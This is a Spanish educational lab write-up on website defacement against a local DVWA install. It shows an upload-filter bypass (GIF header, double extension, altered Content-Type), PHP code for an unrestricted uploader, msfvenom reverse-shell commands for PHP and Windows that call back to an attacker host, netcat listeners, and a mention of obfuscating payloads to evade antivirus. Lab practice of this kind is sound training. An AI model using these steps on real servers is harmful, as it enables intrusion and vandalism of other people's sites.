---
description: >-
  En este artículo veremos en que consiste el Website Defacement y realizaremos
  una práctica en un laboratorio local con nuestras VMs.
---

# Website Defacement

![](../.gitbook/assets/image%20%28158%29.png)

## ¿Que es el Website Defacement?

El **`Website Defacement`** consiste en atacar una web con el objetivo de cambiar su apariencia. Normalmente la página de inicio es reemplazada por algún mensaje que indique que la misma fue vulnerada. Podemos pensar este tipo de ataque como una suerte de vandalismo como los **`graffitis`** de protesta en los frentes de los destacamentos policiales o en los ventanales de centros comerciales. 

![Ejemplo de Website Defacement](../.gitbook/assets/image%20%28194%29.png)

Muchas veces este tipo de ataques están destinados a esparcir un mensaje de naturaleza política o de protesta, en otros casos se busca impactar la reputación del sitio web y en otros casos se realiza simplemente para que el atacante pueda presumir que ha hackeado la web en cuestión.

![Example of Website Defacement](../.gitbook/assets/image%20%28192%29.png)

Algunas de las webs más famosas del mundo han sido victimas de este tipo de ataque en algún momento. En 2012 **Google Romania** fue hackeado y todo usuario de Rumania que intentaba acceder al buscador era presentado con una página que advertía que fueron hackeados. Cabe destacar que se sospecha que este ataque en realidad duró al menos 5 días hasta que lograron revertir los cambios en el lapso de unas horas luego de detectarlo. En 2018 una web de información médica y encuestas a pacientes manejada por la **National Health Service de United Kingdom**, fue también victima de este tipo de ataque. Durante ese tiempo cualquiera que intentaba acceder a la web podía ver el mensaje de defacement:  **"Hacked by AnoaGhost".**

En 2019 al menos **15 mil** sitios web de Georgia\(el país europeo\) fueron hackeados para realizar un masivo ataque de defacement y eventualmente estos sitios fueron puestos offline por los atacantes. Entre estas webs estaban sitios gubernamentales, bancos, medios periodisticos y cadenas de televisión. 

Cabe destacar que para llevar a cabo este tipo de ataques, se utilizan variadas técnicas para explotar vulnerabilidades como **`XSS`**, **`SQL Injection`**, **`CSRF`**, **`DNS Hijacking`**, etc. 

Es decir que los vectores de ataques que pueden usarse para obtener el control de la web dependen en realidad de las vulnerabilidades presentes en la web que se intenta atacar para hacer el Defacement.



## Creando un lab para practicar Web Defacement

{% hint style="danger" %}
**ANTECIÓN:** Este laboratorio de práctica **esta pensado con fines educativos**. No intentes realizar esto es una web que no te pertenece. No me hago responsable por uso ilícito de esta información.
{% endhint %}

Veremos como podemos ahora poner este tipo de ataque en práctica usando una aplicación web vulnerable, en una máquina virtual. Para levantar este laboratorio usaremos lo siguiente:

* **VM Windows 10**: Esta VM será la encargada de servir nuestra aplicación vulnerable. _Puedes usar Linux/OSx si así lo prefieres._ 
* **XAMPP**: Nos permitirá instalar rápidamente nuestra aplicación webs vulnerable.
  * \*\*\*\*[**Link para la Descarga.**](https://www.apachefriends.org/download.html) ****
* **DVWA\(Damn Vulnerable Web Application\)**: La aplicación vulnerable con la cual podremos practicar variadas técnicas y ataques. En este caso la usaremos para hacer un Web Defacement.
  * \*\*\*\*[**Link para la Descarga.**](https://dvwa.co.uk/)\*\*\*\*

{% hint style="info" %}
**NOTA:** No incluiremos los pasos para configurar la VM con Windows en esta práctica. Es un proceso sencillo que puedes ver con una simple búsqueda en Google. No obstante, esta práctica si incluirá un breve instructivo para configurar XAMPP y DVWA.
{% endhint %}

### Instalando XAMPP

La instalación de **`XAMPP`** es bastante simple, basta con ejecutar el instalador y prácticamente hacer click en Next con los valores por default hasta que comience la instalación.

![](../.gitbook/assets/image%20%28178%29.png)

En mi caso optaré por instalar todo en Inglés, en tu caso puedes optar por otro idioma en el siguiente paso de la Instalación:

![](../.gitbook/assets/image%20%28157%29.png)

Una vez seleccionados los ajustes deseados, el instalador nos informará que todo esta listo para comenzar la instalación:

![](../.gitbook/assets/image%20%28174%29.png)

Al comenzar la instalación veremos una pantalla similar a esta:

![](../.gitbook/assets/image%20%28145%29.png)

Una vez completada la instalación, marcamos el checkbox para que se abra el panel de control de XAMPP:

![](../.gitbook/assets/image%20%28187%29.png)

Al abrirse el panel de control de **`XAMPP`** solamente nos resta hacer click en el botón **`Start`** para las opciones **`Apache`** y **`MySQL`**. Una vez completada la inicialización de estas opciones veremos lo siguiente:

![](../.gitbook/assets/image%20%28173%29.png)

{% hint style="danger" %}
**NOTA:** En caso de recibir algún error al intentar inicializar Apache, asegúrate de detener cualquier servicio que esté usando los mismos puertos que intenta utilizar Apache \(**`80`** y **`443`**\).
{% endhint %}

![](../.gitbook/assets/image%20%28184%29.png)

![](../.gitbook/assets/image%20%28188%29.png)

En algunos casos puede que el **`Firewall de Windows`** nos pida confirmación para darle acceso a **`Apache y MySQL`**. Asegúrate de hacerlo en caso de que te salga esa confirmación.

Con esto ya tenemos nuestro stack de **`XAMPP`** listo para cargar nuestra aplicación web vulnerable y comenzar con nuestra práctica. A continuación veremos como configuramos **`DVWA`** para que sea servida con **`XAMPP`** y podamos acceder a esta app.

### Instalando DVWA

Ahora que tenemos XAMPP configurado, el siguiente paso es instalar nuestra web app vulnerable para que pueda ser accedida y eventualmente atacada para nuestra práctica de Web Defacement. Lo primero que necesitamos hacer es descargar DVWA y descomprimir la carpeta en el escritorio de la VM de Windows 10 \(o donde gustes\).

En mi caso optaré por renombrar esta carpeta de su nombre original DVWA-master a simplemente DVWA. Esto lo hago dado que el nombre, cualquiera sea el que pongamos, será el que utilizaremos para acceder desde la URL a esta Aplicación Web.

Al tener la carpeta lista, debemos moverla o copiarla  dentro del sub-directorio llamado **`htdocs`** dentro la carpeta de instalación de **`XAMPP`**. En mi caso opté por instalar XAMPP en la siguiente ruta **`C:\xampp`** y luego dentro copie la carpeta **`DVWA`** dentro de **`htdocs`**. Como se muestra en la imagen a continuación:

![](../.gitbook/assets/image%20%28161%29.png)

El siguiente paso es modificar el archivo de configuración de **`DVWA`** para que pueda conectarse a la base de datos **`MySQL`** que fue configurada por **`XAMPP`**. Para esto ingresamos al directorio **`DVWA`**, luego al sub-directorio llamado **`config`** y creamos una copia del file llamado **`config.inc.php.dist`** y renombramos la copia como **`config.inc.php`**. Una vez listo esto, abrimos ese archivo con el block de notas o tu editor de preferencia y veremos lo siguiente:

![](../.gitbook/assets/image%20%28181%29.png)

Lo único que necesitamos cambiar en este file es el username y password de la DB, por los siguientes:

* **db\_user:** `root`
* **db\_password:** `lo dejamos vacío`.

El archivo debe quedarnos como en la siguiente imagen:

![](../.gitbook/assets/image%20%28206%29.png)

Al terminar guardamos los cambios y ya estamos listos para abrir nuestra web app en el browser. Para eso abrimos nuestro browser y navegamos a la siguiente URL: **`localhost/DVWA/setup.php:`**

![](../.gitbook/assets/image%20%28183%29.png)

Veremos que la aplicación cargará por default la página para hacer el setup de la base de datos. Una vez en esta página solo debemos hacer click en el botón llamado Create/Reset Database ubicado al final de la página y al cabo de un momento veremos lo siguiente:

![](../.gitbook/assets/image%20%28164%29.png)

Si todo ha salido bien, la aplicación nos redirigirá automáticamente al formulario de inicio de sesión de la app:

![](../.gitbook/assets/image%20%28165%29.png)

{% hint style="success" %}
NOTA: Para acceder usamos las credenciales: **`admin`** y **`password`**
{% endhint %}

Una vez dentro de la app, configuraremos el nivel de seguridad medio y aplicaremos los cambios. DVWA nos permite configurar distintos niveles de seguridad para practicar diversos tipos de ataques simulando aplicaciones más o menos vulnerables. En este caso usaremos el nivel Medium, basta con seleccionarlo en DVWA Security -&gt; Medium y darle click al botón de Submit. Una vez hecho veremos el mensaje de confirmación debajo, como se muestra en la siguiente imagen:

![](../.gitbook/assets/image%20%28151%29.png)

Con todo esto configurado, estamos listos para ver que manera vulnerar esta app para lograr nuestro objetivo de practicar el Web Defacement.

## Practicando Website Defacing

![](../.gitbook/assets/image%20%28147%29.png)

### Las Herramientas

Para nuestra práctica de defacement, usaremos las siguientes herramientas. Asegúrate de descargarlas en tu máquina de ataque y dejarla Burp instalado. En mi caso usare Kali que ya viene con **`Burp Suite Community`** instalado. Debo aclarar que nunca antes había intentado vulnerar esta aplicación web, por ende este escrito puede ser bastante largo dado que voy a documentar todo proceso que intente seguir para poder hackearlo.

* **Herramientas que usaremos para el Defacement:** 
  * **Burp Suite \[**[**LINK**](https://portswigger.net/burp/communitydownload)**\]:** Para analizar el las requests que se generen desde/hacia la aplicación vulnerable. Incluso usaremos Burp para burlar ciertos mecanismos de seguridad de la aplicación con el fin de obtener el acceso necesario para hacer el defacement. ****
  * **msfvenom**: Crearemos un payload que nos permita un acceso inicial al servidor, desde el cual podamos eventualmente realizar el defacement. 
  * **Index.html \[**[**LINK**](https://codepen.io/tzero86/pen/WNoXaRJ)**\]:** El archivo HTML personalizado que será usado para reemplazar el home page de nuestra aplicación víctima. Este archivo esta adaptado para esta práctica de varios ejemplos de defacement que encontré por internet, incluyendo uno creado por **`Wh1t3R0s3`**.

### Testeando posibles vulnerabilidades en File Uploads

Lo primero que haremos en abrir **Burp** para usar el navegador integrado que tiene y revisar que tenemos acceso a la web que levantamos con **XAMPP**. Todo esto lo haré desde la **VM** con **Kali**. La idea es revisar el módulo de subida de archivos que tiene **DVWA** e intentar vulnerar sus protecciones, para poder subir un payload que nos de un acceso inicial a este servidor donde se aloja la app. Abrimos Burp entonces, y navegamos a la URL donde instalamos esta app.

![](../.gitbook/assets/image%20%28189%29.png)

1. Una vez abierto **Burp Suite**, navegamos a la siguiente ruta para abrir el browser integrado: **`Proxy Tab -> Intercept Tab -> Open Browser button`** \(both the one in the tab header and the one in the body of burp tab content do the same\).
2. Navegamos hasta la URL de nuestra app web vulnerable: **`Windows-VM-IP:port/pathDVWA:`**
   1. **Windows-VM-IP:** El IP de la VM \(Windows 10 en mi caso\) donde esta corriendo **`XAMPP`** y nuestra app **`DVWA`**.
   2. **Port:** El puerto para conectarnos al contenido que esta sirviendo **`XAMPP`** \(**`80`** y **`443`**\).
   3. **pathDVWA:** El nombre de la carpeta donde guardamos **`DVWA`**, que esta dentro de **`XAMPP/htdocs`**.
3. **Login en DVWA:** en este caso no nos interesa vulnerar este formulario de login, dado que ya conocemos las **`credenciales (admin:password)`**. El reto que nos interesa resolver esta dentro de el dashboard de DVWA, y es el que nos dará el acceso para realizar nuestro defacement.

Una vez logueados en nuestra app, navegamos a la opción File Upload en el menú de la izquierda de la app:

![](../.gitbook/assets/image%20%28190%29.png)

La idea de nuestro ataque será la siguiente. Intentaremos vulnerar el formulario de carga que expone esta parte de la app, la cual únicamente admite imágenes. Y veremos de que forma podemos burlar esa protección para poder subir nuestro **form PHP**. Este **form PHP** nos dará acceso para poder eventualmente subir archivos que nos den acceso para poder manipular los archivos del servidor, en contreto el archivo que se carga como el home de esta web app\(**`index.php`**\). Ese archivo index, será luego reemplazado por nuestro **HTML para defacement** que dejé preparado antes. De esta manera realizaremos nuestro defacement.

Para comenzar activaremos el interceptor en Burp suite de manera que la comunicación entre nuestro browser en Kali y la web app pueda ser interceptada. Nos interesa conocer que tipo de request se envía al servidor cuando subimos una imagen válida y cuando intentamos subir un archivo cuya extensión no esta permitida. Evaluaremos las diferencias con Burp y veremos como podemos manipular esta request inválida para convencer al servidor de que el archivo que intentamos subir es una imagen y no un PHP.

Veamos que sucede en la request enviada cuando subimos una imagen valida:

![](../.gitbook/assets/image%20%28152%29.png)

Y vemos que al hacer click en Forward, la request es procesada y aceptada por el servidor:

![](../.gitbook/assets/image%20%28168%29.png)

Podemos observar dos datos importantes en la request:

* **`Content-Type: image/jpeg`**: El cuál indica que el servidor interpretará el archivo que se intenta subir como, lo que en este caso, es. Una imagen.
* **`Filename="Test1.jpg"`**: El nombre de archivo y su extensión. 

Y si navegamos a esa ruta, vemos que en efecto nuestro archivo de imagen se encuentra en el servidor:

![](../.gitbook/assets/image%20%28169%29.png)

Veamos como se comporta la request cuando el archivo subido contiene una extensión prohibida.

![](../.gitbook/assets/image%20%28170%29.png)

Y al hacer el forward de esa request, vemos que la misma es detectada invalida y rechazada como esperábamos:

![](../.gitbook/assets/image%20%28201%29.png)

Podemos observar los mismo datos importantes en esta request:

* **`Content-Type: application/x-php`**: El cuál indica que el servidor interpretará el archivo que se intenta subir como un archivo **`php`**.
* **`Filename="Test_shell.php"`**: El nombre de archivo y su extensión. 

Contando con esta información, podemos teorizar que ambos parámetros influyen cuando los controles \(o filtros\) implementados para sanitizar los archivos que se suben, son ejecutados. 

### Obteniendo el Acceso Inicial: Vulnerando el File Upload

Con esta información podemos intentar nuestro primer ataque para intentar subir nuestro form y burlar este control implementado por la app. Lo haremos mediante modificaciones a la request que se manda al servidor cuando hacemos click en Upload luego de adjuntar un archivo PHP.

**Repasemos entonces lo que intentaremos:**

1. Crearemos un formulario de carga de archivos propio, el cual no tenga ninguna protección y nos permita subir cualquier tipo de archivo. Este formulario será el primer archivo que debemos lograr subir, y es el que nos abrirá las puertas al servidor.
2. Intentaremos ver de que forma podemos lograr subir este formulario al servidor, para lo cual atacaremos el formulario de File Uploads de DVWA.
3. Al subir nuestro formulario, interceptaremos la request con **`Burp Suite`** y modificaremos el **`Filename`** y **`Content-Type`** para especificar que nuestro **`Form PHP`** es en realidad una imagen y ver si de esta forma podemos burlar la protección.
4. Enviaremos la request modificada al servidor.
5. Con esto probaremos si en efecto esta request modificada podrá pasar por alto las protecciones de la app y si nuestro archivo se subirá sin problemas.
6. Una vez tengamos el **`Custom File Upload Form`** subido, lo usaremos para cargar un **`payload(php reverse shell en este caso)`** con el cual, si todo sale bien, tendremos el acceso inicial para poder comenzar con el defacement.



#### Creando nuestro Custom File Upload sin restricciones

No voy a ir en detalle sobre como crear este formulario PHP, dejaré el código que preparé debajo y el repositorio de una idea similar que me sirvió para mas o menos armar todo.

Es muy posible que el mecanismo de verificación de subidas que esta utilizando esta app pueda detectar nuestro código PHP como una app, a pesar de indicarle **`Content-Type`**, **`Filename`** y **`headers`** como si fueran los de una imagen.  Por este motivo intentaremos enmascarar lo mejor posible nuestro formulario, al mismo tiempo que tratamos de mantenerlo lo más pequeño posible.

Lo que haremos es crear un archivo **`PHP`** y **`HTML`** muy pequeño que simplemente genere un formulario de subida de archivos sin ningún tipo de restricción. Si logramos que este pequeño form suba sin problema, estaremos más cerca de tener el acceso necesario para hacer el defacement.

El código quedaría de esta manera:

{% hint style="success" %}
Puedes descargar el ejemplo que usé de base desde el siguiente repositorio: 👉 [LINK](https://gist.github.com/taterbase/2688850)
{% endhint %}

```text
GIF98
<?php

if(isset($_POST['upload'])){
  $file_name = $_FILES['file']['name'];
  $file_type = $_FILES['file']['type'];
  $file_size = $_FILES['file']['size'];
  $file_temp = $_FILES['file']['tmp_name'];
  $file_save = ".\\". $file_name;
  move_uploaded_file($file_temp, $file_save);
}

echo '
  <!DOCTYPE html>
  <html>
  <head>
    <title>CEH-UTN-UPLOAD</title>
  </head>
  <body>
    <br>
    <img src="https://i.imgur.com/kNiob7g.png" alt="by tzero86">
    <form action="?" method="POST" enctype="multipart/form-data">
      <label>Subir Archivo</label>
      <p><input type="file" name="file"></p>
      <p><input type="submit" name="upload" value="Subir"></p>
    </form>
  </body>
  </html>
'
?>
```

Este archivo lo guardaré como **`GIF98.php.jpg`** en un intento de burlar algún control que revise la extensión del archivo subido. Es bastante común que protecciones débiles implementadas en las web apps, únicamente verifiquen solamente desde el final del nombre de archivo hasta el primer punto \(.jpg\) ignorando la segunda extensión **\(.php\)**. Algunas veces esta verificación se da al revés, y se controla de izquierda a derecha desde el nombre del archivo por ende es posible que tengamos que cambiar el nombre a **GIF98.php.jpg**.

También editaremos la request luego de hacer click en **`Upload`** en la app, para **`eliminar la extensión jpg`** y dejar el parámetro **`Filename`** de esta manera: **`Filename=GIF98.php`.** 

El nombre de este formulario puede ser el que quieras, en mi caso opté por ese sin razón técnica alguna pero fue luego de revisar algunos recursos como **Hacktricks y Penetration Testing Playbook**, donde se menciona la posibilidad de burlar algunas protecciones mediante el agregado a nuestro PHP de una cabecera de imagen **\(header**\):

![](../.gitbook/assets/image%20%28196%29.png)

El concepto es simple se intenta que el servidor interprete las cabeceras de la request y luego al "ver" el contenido lo primero que encuentre sea una instrucción \(header\) que este normalmente asociado a un archivo de imagen.  En el caso ejemplo de arriba vemos que este header es **`GIF89a`**, pero también existen otros como **`GIF98`** que es el que voy a usar en este lab.

Veamos si esta esta idea funciona: En **`DVWA -> File Upload`** cargaremos nuestro formulario e interceptamos la request con burp luego de subirlo.

Modificaremos lo siguiente si es que la request evidencia que al subir el archivo el formato del mismo es detectado como **application/x-php** y no como imagen:

1. Cambiamos el valor de **`Filename=GIF98.php.jpg`** a **`Filename=GIF98.php`**
2. Cambiamos el valor de **`Content-Type: application/x-php`** a **`Content-Type: image/jpeg`**

La request nos quedará de la siguiente forma:

![](../.gitbook/assets/image%20%28159%29.png)

Al darle Forward a la quest modificada vemos el resultado:

![](../.gitbook/assets/image%20%28208%29.png)

Lo hemos logrado! pudimos burlar la protección de la app y subimos nuestro propio File Uploader. Veamos ahora si logramos cargarlo accediendo a la ruta que nos da la app en el mensaje:

![](../.gitbook/assets/image%20%28191%29.png)

Y en efecto podemos abrir nuestro File Uploader:

![](../.gitbook/assets/image%20%28207%29.png)

Podemos probar este formulario para ver que en efecto cualquier archivo que subamos, sin importar su extensión. En este caso ya lo he probado y funciona, por ende no voy a cubrir esa mini prueba dado que esta práctica ya esta bastante larga.

#### Creando nuestro reverse shell con msfvenom

{% hint style="warning" %}
**NOTA:** En un escenario real muchos de estos payloads que creamos pueden ser fácilmente detectados por el Firewall y Antivirus que estén instalados en el servidor. En este caso como estamos practicando en un laboratorio de pruebas no tendremos ese problema e incluso de tenerlos podemos deshabilitarlos. Para mitigar esto podemos hacer uso de técnicas de obfuscación para lograr subirlos sin que sean detectados.
{% endhint %}

Veamos rápidamente como podemos crear nuestro reverse shell usando **`msfvenom`**. No usaremos **`metasploit`**, directamente intentaremos conectar el reverse shell a nuestro listener de **`netcat`** en la terminal de Kali.

```text
msfvenom -p php/reverse_php LHOST=IP_VM_ATAQUE LPORT=PUERTO_DESEADO -f raw > nombre_delShell.php
```

En mi caso:

![](../.gitbook/assets/image%20%28156%29.png)

Ahora que ya tenemos nuestro payload, dejamos nuestro listener preparado:

![](../.gitbook/assets/image%20%28155%29.png)

Con todo listo subimos nuestro payload:

![](../.gitbook/assets/image%20%28150%29.png)

En efecto si vamos a la URL donde se suben los archivos, veremos nuestro payload:

![](../.gitbook/assets/image%20%28163%29.png)

Por último veamos si logramos obtener la conexión al server por reverse shell al abrir nuestro payload:

![](../.gitbook/assets/image%20%28177%29.png)

Y en nuestra terminal finalmente recibimos la conexión:

![](../.gitbook/assets/image%20%28200%29.png)

Lo próximo es el defacement que veremos a continuación, para el defacement el objetivo es reemplazar **`index.php`** con nuestro archivo web que preparamos para el defacement.

![](../.gitbook/assets/image%20%28146%29.png)

Antes que podamos proceder con el defacement debemos solucionar un pequeño problema, la conexión que recibimos con nuestro reverse shell es bastante inestable y la conexión al server se corta rápidamente. Para mitigar este problema intentaremos crear un **`segundo payload`** con en formato exe para la plataforma Windows donde corre la app. La idea es que una vez tengamos la conexión inicial con el **`payload1`**, ejecutaremos el **`payload2`** para obtener una sesión más estable en un **`netcat`** listener secundario.

Para crear este segundo payload, también usaremos **`msfvenom`**:

```text
msfvenom -p windows/shell_reverse_tcp LHOST=IP_VM_ATAQUE LPORT=PUERTO_DESEADO -f exe > nombre_payload2.exe
```

Creamos este segundo payload:

![](../.gitbook/assets/image%20%28171%29.png)

Y una vez creado lo subimos con nuestro custom upload form, como hicimos con el primer payload.

![](../.gitbook/assets/image%20%28205%29.png)

Ahora dejaremos **`2 listeners`** corriendo con **`netcat`**, cada uno apuntando al puerto seleccionado durante la creación de estos payloads. En mi caso, **`2112 para el payload php`** y **`2113 para el exe`**. Ejecutaremos entonces el **`payload php`** y al recibir la conexión rápidamente ejecutaremos el payload .exe para recibir la otra conexión por reverse shell que quizá sea más estable:

![](../.gitbook/assets/image%20%28197%29.png)

Ahora finalmente tenemos un segundo shell más estable para trabajar. Lo próximo, finalmente, es el defacement.

### Realizando el Website Defacement

Finalmente, luego de varios procesos tenemos el acceso inicial al servidor para poder realizar el defacement. Veamos si podemos llevarlo a cabo sin encontrar ningún otro obstáculo.

Lo primero es tener nuestro HTML para reemplazar el **`index.php`** listo y lo serviremos online usando un **`HTTP server local`** levantado con **python**:

![](../.gitbook/assets/image%20%28193%29.png)

Luego descargamos ese archivo en el webserver, usando Curl:

![](../.gitbook/assets/image%20%28202%29.png)

Y en efecto vemos que hemos logrado cargar nuestro **`HTML`** para el defacement:

![](../.gitbook/assets/image%20%28162%29.png)

Veamos si logramos ver el defacement al acceder a la ruta principal de **`DVWA`**:

![](../.gitbook/assets/defacement_lab_tzero86.gif)

Lo hemos logrado, lo más dificultoso fue aprender de que manera vulnerar las protecciones de la carga de archivos de esta web app y como generar una conexión estable por reverse shell que nos permita luego llevar a cabo nuestro **Website Defacement**.

Espero que este práctica te sea de utilidad en tus estudios, ciertamente yo he aprendido mucho al durante esta práctica y la elaboración de este escrito.

{% hint style="info" %}
Estas prácticas están sujetas a modificaciones y correcciones, la versión más actualizada disponible se encuentra online en [el siguiente link](https://tzero86.gitbook.io/tzero86/).
{% endhint %}

